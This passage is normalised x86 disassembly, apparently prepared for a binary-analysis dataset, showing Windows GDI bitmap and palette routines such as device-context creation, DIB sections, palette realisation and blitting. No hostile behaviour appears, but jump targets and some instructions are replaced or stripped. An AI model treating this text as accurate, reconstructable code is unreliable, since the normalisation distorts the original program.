call sub_403164
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_426740
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_422cb4
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_426450
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_426450
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_42678c
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_4255f0
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42683b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_426848
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_426894
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_426450
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_424e5c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424e5c
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_426ee2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026f4
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_426bec
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_424d48
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_424e5c
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_424e5c
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_424e5c
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_424e5c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_426e93
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_426e82
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_426e60
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_424e5c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_426848
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028f0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_4255f0
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424244
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_416c50
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423584
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424208
call sub_423584
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_424db4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e67
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424e5c
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_426e36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424e5c
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_402714
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423584
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424208
call sub_423584
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423584
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424208
call sub_423584
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424e5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_4039d4
call sub_4039d4
jmp r-xdata
sub_426e89
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_426e98
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403950
call sub_4039a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_426ef8
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_426f5c
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_426450
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_427157
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_424e5c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424e5c
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424e5c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42710f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_426894
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_427168
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_425fc4
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_4266c0
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_4271d0
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax esi
call sub_4278e0
mov eax [ esi + 0x28 ]
call sub_4266c4
mov eax [ esi + 0x2c ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b44
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_42720c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4272c4
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b80
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_427b50
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_4266c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_4266c4
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418b70
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_4272fc
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4278e0
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42738b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_426ef8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_426894
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_427b50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_427390
mov eax [ ebp - 0x8 ]
call sub_422cb4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403950
call sub_4039a4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_4273bc
push ebx
mov ebx eax
mov eax ebx
call sub_4276b0
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40cfec
pop ebx
retn
sub_4273ec
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41ab48
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_4278e0
lea eax [ ebx + 0x2c ]
call sub_40cfec
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_427b50
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_427460
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_424b44
mov eax ebx
call sub_4279f0
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_4277ec
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_42769c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_424a70
push eax
call SetStretchBltMode
mov eax ebx
call sub_427730
mov dl [ r-xdata ]
call sub_424b44
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_427990
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_427730
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4276a3
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_427631
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_424e5c
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_427730
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_425000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_4276b0
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_4278f0
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4272fc
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_424db4
sub_427730
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_4278f0
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4264cc
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
